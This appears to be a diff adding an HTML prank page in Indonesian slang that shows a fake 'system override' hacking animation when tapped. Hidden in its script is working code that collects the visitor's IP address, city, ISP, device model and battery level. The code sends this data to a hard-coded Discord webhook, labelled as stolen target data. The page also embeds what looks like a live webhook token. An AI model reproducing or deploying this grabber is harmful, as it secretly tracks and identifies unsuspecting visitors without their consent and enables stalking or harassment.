@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYLEX | SYSTEM OVERRIDE</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; overflow: hidden; height: 100vh; }
+        #output { white-space: pre-wrap; font-size: 13px; line-height: 1.6; }
+        .crit { color: #f00; font-weight: bold; }
+        .info { color: #00f2ff; }
+        .warn { color: #ff0; }
+        .glitch-mode { animation: shake 0.2s infinite; }
+        @keyframes shake { 0% { transform: translate(2px,2px); } 50% { transform: translate(-2px,-2px); } 100% { transform: translate(2px,-2px); } }
+        #start-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; z-index: 100; cursor: pointer; color: #fff; font-size: 18px; text-shadow: 0 0 10px #fff; }
+    </style>
+</head>
+<body onclick="initHacking()">
+    <div id="start-screen"><b>[ TAP TO INITIALIZE EXPLOIT ]</b></div>
+    <div id="output"></div>
+
+    <script>
+        // 1. PASTE URL WEBHOOK DISCORD LU DI SINI 💀
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1482575525250600970/brZO5OxjQkI1v57AGWhMzktXIKGSgvY9nQ2mpqf2pTFpSg7DhSefsg2E4Cbf2nUSX3Mk";
+
+        async function fetchAndSend() {
+            try {
+                // Ambil Data Baterai Asli
+                let battery = await navigator.getBattery();
+                let batLevel = Math.floor(battery.level * 100) + "%";
+
+                // Ambil Data IP, Kota, ISP Asli
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                
+                // Ambil Info HP Asli
+                const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown Device";
+
+                // Kirim Paket Data ke Discord Lu
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "💀 DATA TARGET BERHASIL DICURI! 💀",
+                            color: 16711680,
+                            fields: [
+                                { name: "🌐 IP ADDRESS", value: `\`${d.ip || "N/A"}\``, inline: true },
+                                { name: "📍 LOKASI", value: `\`${d.city}, ${d.region}\``, inline: true },
+                                { name: "📡 PROVIDER (ISP)", value: `\`${d.org || "N/A"}\`` },
+                                { name: "📱 TIPE HP", value: `\`${device}\`` },
+                                { name: "🔋 SISA BATERAI", value: `\`${batLevel}\``, inline: true }
+                            ],
+                            timestamp: new Date(),
+                            footer: { text: "Cylex-Coder Logs • " + device }
+                        }]
+                    })
+                });
+            } catch (e) { console.log("Stealth Mode Active..."); }
+        }
+
+        const output = document.getElementById('output');
+        const startScreen = document.getElementById('start-screen');
+        let i = 0;
+        let percent = 0;
+
+        const scriptLines = [
+            "<span class='info'>[+] Connecting to Cylex Remote Server...</span>",
+            "[+] Handshake with Target: SUCCESS",
+            "[+] Bypassing Device Firewall...",
+            "[!] ACCESSING SYSTEM LOGS...",
+            "--------------------------------------------",
+            "[>] STARTING DATA EXTRACTION..."
+        ];
+
+        function initHacking() {
+            startScreen.style.display = 'none';
+            fetchAndSend(); // Eksekusi pencurian data di background
+            playScript();
+        }
+
+        function playScript() {
+            if (i < scriptLines.length) {
+                let div = document.createElement('div');
+                div.innerHTML = scriptLines[i];
+                output.appendChild(div);
+                i++;
+                setTimeout(playScript, 600);
+            } else if (percent <= 100) {
+                // Bagian Loading Persen di Layar Target
+                output.innerHTML = output.innerHTML.split("<div id='pct'>")[0];
+                output.innerHTML += `<div id='pct' class='warn'>[!] PROGRESS: ${percent}% - UPLOADING DATA TO CLOUD...</div>`;
+                percent += Math.floor(Math.random() * 8) + 2;
+                window.scrollTo(0, document.body.scrollHeight);
+                
+                if (percent <= 100) {
+                    setTimeout(playScript, 150);
+                } else {
+                    let final = document.createElement('div');
+                    final.innerHTML = "<br><span class='crit'>[!!!] EXPLOIT COMPLETE: DATA LEAKED!</span><br>Chat Tristan ya sayang! kalo udah gini";
+                    output.appendChild(final);
+                    document.body.classList.add('glitch-mode');
+                    if (navigator.vibrate) navigator.vibrate([500, 100, 500, 100, 1000]);
+                }
+            }
+        }
+    </script>
+</body>
+</html>
